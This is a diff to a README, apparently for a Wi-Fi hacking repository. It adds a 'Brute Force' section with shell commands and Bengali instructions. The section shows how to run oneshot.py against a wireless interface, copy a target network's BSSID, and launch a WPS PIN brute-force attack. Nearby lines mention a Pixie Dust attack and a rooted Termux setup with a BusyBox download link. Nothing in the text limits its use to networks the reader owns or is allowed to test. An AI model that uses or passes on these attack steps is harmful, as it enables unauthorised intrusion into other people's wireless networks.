@@ -20,6 +20,26 @@ ls
 sudo python oneshot.py -i wlan0 -K
 ```
 
+## [Brute Force]
+```
+cd WIFI-HACK
+```
+```
+ls
+```
+```
+sudo python oneshot.py -i wlan0 -K
+```
+এখন আমরা BSSID কপি করব, যা দেখতে কিছুটা MAC অ্যাড্রেসের মতো হবে। Example: B4:0F:3B:57:F0:90 -B
+তারপর আমরা Ctrl + C চাপব, এতে টুলটি বন্ধ হয়ে যাবে।
+তারপর আমরা cd কমান্ড দিয়ে হোম ডিরেক্টরিতে চলে যাব।
+```
+cd WIFI-HACK
+```
+```
+sudo python oneshot.py -i wlan0 -b (BSSID) -B
+```
+
 ## [Termux](https://termux.com/)
 Please note that root access is required.  
 #### Download BusyBox....https://github.com/W8SOJIB/W8RootWifiHK/raw/main/BusyBox%20Free_64.apk
